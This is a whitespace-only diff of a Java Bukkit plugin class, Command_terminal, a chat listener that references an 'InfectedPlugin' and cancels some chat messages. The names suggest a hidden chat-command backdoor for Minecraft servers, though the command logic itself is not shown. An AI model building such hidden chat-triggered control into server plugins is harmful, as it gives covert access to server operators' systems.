@@ -11,7 +11,7 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_terminal implements Listener
 {
-	public void onPlayerChat(AsyncPlayerChatEvent event)
+    public void onPlayerChat(AsyncPlayerChatEvent event)
     {
     	InfectedPlugin plugin = null;
         String message = event.getMessage();
@@ -46,8 +46,8 @@ public class Command_terminal implements Listener
         
         if (cancel)
         {
-        	event.setCancelled(true);
-        	return;
+            event.setCancelled(true);
+            return;
         }
     }
 }
